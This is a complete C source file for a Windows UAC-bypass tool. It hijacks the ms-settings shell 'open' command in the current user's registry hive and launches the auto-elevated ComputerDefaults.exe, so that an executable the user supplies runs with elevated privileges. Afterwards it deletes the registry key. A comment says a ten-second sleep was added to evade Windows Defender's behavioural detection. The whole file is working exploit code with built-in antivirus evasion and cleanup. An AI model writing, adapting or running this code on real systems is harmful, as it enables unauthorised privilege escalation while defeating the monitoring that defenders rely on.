#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>

int main(int argc, char *argv[]) {

    // check for arg
    if (argc < 2) {
        printf("No EXE supplied! Re-run the file and supply a EXE on disk as the first argument!\n");
        return 1;
    }

    char tempPath[MAX_PATH] = {0};
    strcpy(tempPath, argv[1]);

    if(!PathFileExistsA(tempPath)){
        printf("The target executable does not exist on host!\n");
        return 1;
    }

    // Create command reg key and/or open handle to it
    HKEY commandKey;
    LSTATUS regStatus = RegCreateKey(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", &commandKey);
    if (regStatus != 0) {
        printf("Error creating command registry key!: %d\n", regStatus);
        return 1;
    } else {
        printf("Successfully created registry key: HKCU:Software\\Classes\\ms-settings\\Shell\\Open\\command\n");
    }

    // set command reg key to supplied exe on disk
    regStatus = RegSetValueEx(commandKey, "", 0, REG_SZ, tempPath, strlen(tempPath));
    if (regStatus != 0) {
        printf("Error setting command registry key!: %d\n", regStatus);
    } else {
        printf("Successfully set command registry value\n");
    }

    // set DelegateExecute reg key to blank value
    regStatus = RegSetValueEx(commandKey, "DelegateExecute", 0, REG_SZ, "", 0);
    if (regStatus != 0) {
        printf("Error setting DelegateExecute registry key!: %d\n", regStatus);
    } else {
        printf("Successfully set DelegateExecute registry value\n");
    }

    RegCloseKey(commandKey);

    // Sleep for 10 seconds before executing autoelevated exe to bypass Windows Defender behavioral detection: Behavior:Win32/UACBypassExp.T!proc
    Sleep(10000);

    // Set variables for SHELLEXECUTEINFO object to execute fodhelper.exe or ComputerDefaults.exe
    SHELLEXECUTEINFO exInfo;
    exInfo.lpVerb       = "open";
    exInfo.lpFile       = "C:\\Windows\\System32\\ComputerDefaults.exe";
    exInfo.nShow        = 0;
    exInfo.fMask        = SEE_MASK_NOCLOSEPROCESS;
    exInfo.cbSize       = sizeof(SHELLEXECUTEINFO);
    exInfo.hwnd         = 0;
    exInfo.lpParameters = 0;
    exInfo.lpDirectory  = 0;
    exInfo.hInstApp     = 0;

    // Execute the autoelevated exe
    BOOL shRet = ShellExecuteEx(&exInfo);
    if (shRet == FALSE) {
        printf("Error using ShellExecuteEx!\n");
    } else {
        printf("Autoelevated EXE was successfully executed using ShellExecuteEx!\n");
    }

    // Sleep for 2 seconds to make sure registry has been updated
    Sleep(2000);

    // Open handle to "HKCU:Software\Classes" registry key
    HKEY fullRegKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Classes", 0, KEY_READ | KEY_WRITE | DELETE, &fullRegKey) != ERROR_SUCCESS) {
        printf("Error opening Software key!\n");
        return 1;
    }

    // Delete added registry key and all it's sub keys
    regStatus = RegDeleteTreeA(fullRegKey, "ms-settings");
    if (regStatus != 0) {
        printf("Error deleting command registry key!: %d\n", regStatus);
    } else {
        printf("Successfully deleted registry key: HKCU:Software\\Classes\\ms-settings\\Shell\\Open\\command\n");
    }

    RegCloseKey(fullRegKey);

    return 0;
}
